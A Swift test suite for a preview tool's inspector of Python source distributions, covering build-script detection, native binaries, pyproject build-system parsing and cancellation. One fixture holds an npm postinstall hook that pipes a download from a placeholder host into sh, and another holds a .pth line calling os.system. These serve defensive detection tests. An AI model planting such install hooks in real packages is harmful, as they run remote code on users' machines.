import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

@Suite("Python source distribution install findings")
struct PythonSourceInspectorTests {
    private typealias Fixtures = InstallFixtures

    private static let pkgInfo = "Metadata-Version: 2.1\nName: example\nVersion: 1.0\n"

    private func sdist(_ extra: [Fixtures.Member]) throws -> ParsedTextDocument {
        try Fixtures.listing([.file("example-1.0/PKG-INFO", Self.pkgInfo)] + extra)
    }

    // MARK: Layout

    @Test func aSetupScriptMeansABuildScript() throws {
        let document = try sdist([.file("example-1.0/setup.py", "from setuptools import setup\nsetup()\n"),
                                  .file("example-1.0/example/__init__.py", "")])
        #expect(document.findings == [PreviewFinding(kind: .installBuildScript, count: 1)])
        #expect(document.findings.first?.severity == .info)
    }

    @Test func aModernSdistWithAStandardBackendHasNoFinding() throws {
        let toml = "[build-system]\nrequires = [\"flit_core>=3.2\"]\nbuild-backend = \"flit_core.buildapi\"\n"
        #expect(try sdist([.file("example-1.0/pyproject.toml", toml)]).findings.isEmpty)
        #expect(try sdist([]).findings.isEmpty)
    }

    @Test func anInTreeBuildBackendMeansABuildScript() throws {
        let toml = "[build-system]\nrequires = []\nbuild-backend = \"backend\"\nbackend-path = [\"tools\"]\n"
        let document = try sdist([.file("example-1.0/pyproject.toml", toml)])
        #expect(document.findings == [PreviewFinding(kind: .installBuildScript, count: 1)])
    }

    @Test func aSourceTreeWithoutPKGInfoIsAnOrdinaryArchive() throws {
        let document = try Fixtures.listing([.file("example/setup.py", "setup()"), .file("example/README.md", "# x")])
        #expect(document.findings.isEmpty)
    }

    @Test func filesDeeperThanTheTopFolderDoNotCount() throws {
        let document = try sdist([.file("example-1.0/src/setup.py", "setup()"),
                                  .file("example-1.0/example.egg-info/PKG-INFO", Self.pkgInfo),
                                  .file("example-1.0/docs/pyproject.toml", "[build-system]\nbackend-path = [\".\"]\n")])
        #expect(document.findings.isEmpty)
        // The egg-info copy of PKG-INFO alone does not make the folder a source distribution.
        let nested = try Fixtures.listing([.file("example-1.0/setup.py", "setup()"),
                                           .file("example-1.0/example.egg-info/PKG-INFO", Self.pkgInfo)])
        #expect(nested.findings.isEmpty)
    }

    @Test func aPthFileInASourceDistributionIsNotInstalledAndSaysNothing() throws {
        let document = try sdist([.file("example-1.0/example.pth", "import os; os.system('x')\n")])
        #expect(document.findings.isEmpty)
        let withScript = try sdist([.file("example-1.0/setup.py", "setup()"), .file("example-1.0/example.pth", "import os\n")])
        #expect(Fixtures.kinds(withScript) == [.installBuildScript])
    }

    @Test func aPackageJSONInASourceDistributionIsNotReadAsAnNpmPackage() throws {
        let manifest = Fixtures.manifest(scripts: #""postinstall": "curl https://example.invalid/x | sh""#)
        let document = try sdist([.file("example-1.0/setup.py", "setup()"), .file("example-1.0/package.json", manifest)])
        #expect(Fixtures.kinds(document) == [.installBuildScript])
    }

    @Test func nativeMembersAreReportedAtInfoLevelOnlyForARecognizedSdist() throws {
        let members: [Fixtures.Member] = [.file("example-1.0/setup.py", "setup()"),
                                          .file("example-1.0/example/_speedups.so", "x"),
                                          .file("example-1.0/example/tool", bytes: [0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0])]
        let document = try sdist(members)
        #expect(Fixtures.kinds(document) == [.installBuildScript, .artifactNativeCode])
        #expect(Fixtures.finding(.artifactNativeCode, in: document) == PreviewFinding(kind: .artifactNativeCode, severity: .info, count: 2))
        // A source tree without PKG-INFO that ships the same files is not reported.
        #expect(try Fixtures.listing(Array(members.dropFirst())).findings.isEmpty)
    }

    @Test func aPyprojectOverOneMebibyteIsNotReadAndTheListingStillWorks() throws {
        let toml = "[build-system]\nbackend-path = [\".\"]\n" + String(repeating: "#", count: InstallableCapture.maximumPayloadBytes)
        let document = try sdist([.file("example-1.0/pyproject.toml", toml)])
        #expect(document.findings.isEmpty)
        #expect(document.text.contains("example-1.0/pyproject.toml"))
    }

    // MARK: The build-system table

    @Test(arguments: [
        ("[build-system]\nbackend-path = [\"x\"]", true),
        ("[ build-system ]\n  backend-path=['x']\r\n", true),
        ("[\"build-system\"]\n\"backend-path\" = [\"x\"]", true),
        ("[build-system]\nrequires = [\n  \"a\",\n  \"b\",\n]\nbackend-path = [\"x\"]", true),
        ("[build-system]\n# backend-path = [\"x\"]\nrequires = []", false),
        ("[tool.thing]\nbackend-path = [\"x\"]\n[build-system]\nrequires = []", false),
        ("[build-system]\nrequires = []\n[tool.thing]\nbackend-path = [\"x\"]", false),
        ("[[build-system]]\nbackend-path = [\"x\"]", false),
        ("backend-path = [\"x\"]\n[build-system]\nrequires = []", false),
        ("[project]\nname = \"x\"\ndescription = \"\"\"\n[build-system]\nbackend-path = [\"x\"]\n\"\"\"\n[build-system]\nrequires = []", false),
        ("[build-system]\nrequires = [\n  \"a\",\n  [\"nested\"],\n]\nbuild-backend = \"b\"", false),
        ("build-system = { requires = [], build-backend = \"b\", backend-path = [\"x\"] }", true),
        ("build-system.backend-path = [\"x\"]", true),
        ("[build-system]\nrequires = []\nbuild-backend = \"b\"", false),
        ("", false), ("[", false), ("= =", false)
    ])
    func backendPathRules(toml: String, expected: Bool) throws {
        let found = try PyprojectBuildSystem.declaresBackendPath(Data(toml.utf8), context: Fixtures.context)
        #expect(found == expected, "\(toml)")
    }

    // MARK: Cancellation

    @Test func cancellationStopsAnActiveSdistParse() async throws {
        let members: [Fixtures.Member] = [.file("example-1.0/PKG-INFO", Self.pkgInfo), .file("example-1.0/setup.py", "setup()")]
            + (0..<1_500).map { Fixtures.Member.file("example-1.0/example/module\($0).py", "VALUE = \($0)") }
        let data = try Fixtures.gzip(members)
        let budget = PreviewBudget(maxInputBytes: 16_777_216, maxMilliseconds: 30_000)
        try await CancellationTest.expectStopsActiveParse(budget: budget) { context in
            try GZIPPreviewAdapter().parse(FileBytes(data: data), context: context)
        }
    }
}
